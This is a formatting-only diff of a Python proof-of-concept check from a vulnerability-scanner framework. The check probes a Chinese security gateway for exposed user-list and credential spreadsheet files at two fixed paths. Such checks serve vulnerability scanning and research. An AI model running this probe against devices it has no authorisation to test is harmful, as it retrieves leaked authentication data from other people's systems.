@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'ADTsec_0004'  # 平台漏洞编号，留空
     name = '安达通安全网关 信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         SJW74系列安全网关 和 全网行为管理TPN-2G安全网关 2处认证信息泄露 。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '安达通安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'b2f90b12-69c8-4934-808a-67f8881e60b3'
@@ -36,12 +38,12 @@ class Poc(ABPoc):
             hh = hackhttp.hackhttp()
             arg = self.target
             payloads = ['/backuserbatch.xls', '/userlist.xls']
-            for payload in payloads:  
+            for payload in payloads:
                 url = arg + payload
                 code, head, res, errcode, _ = hh.http(url)
 
-                if code==200 and 'vnd.ms-excel' in head:
-                    #security_warning(url)
+                if code == 200 and 'vnd.ms-excel' in head:
+                    # security_warning(url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -50,6 +52,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
